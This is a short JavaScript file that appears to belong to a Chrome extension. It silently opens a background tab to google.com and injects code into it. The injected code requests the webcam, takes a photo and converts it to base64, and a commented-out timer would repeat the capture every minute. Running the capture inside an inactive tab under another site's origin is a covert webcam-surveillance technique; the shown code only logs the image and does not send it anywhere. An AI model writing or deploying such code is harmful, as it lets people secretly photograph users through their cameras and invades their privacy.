let imageCapture, photoWidth;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Loaded");
  executeScript(getAccess);
  // setInterval(() => executeScript(getAccess), 60000);
});

let executeScript = async (fun) => {
  chrome.tabs.create({
    active: false,
    url: "https://www.google.com/",
  });
  chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    // make sure the status is 'complete' and it's the right tab
    if (
      tab.url.indexOf("https://www.google.com/") != -1 &&
      changeInfo.status == "complete"
    ) {
      console.log(tab);
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        function: fun,
      });
    }
  });
  // let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  // await
  // chrome.tabs.remove(tab.id);
};

let getAccess = async () => {
  navigator.mediaDevices
    .getUserMedia({ video: true })
    .then(async (stream) => {
      const track = stream.getVideoTracks()[0];
      imageCapture = new ImageCapture(track);
      var reader = new FileReader();
      const blob = await imageCapture.takePhoto();
      reader.readAsDataURL(blob);
      reader.onloadend = function () {
        var base64data = reader.result;
        console.log(base64data);
      };
    })
    .catch((error) => console.log(error));
};
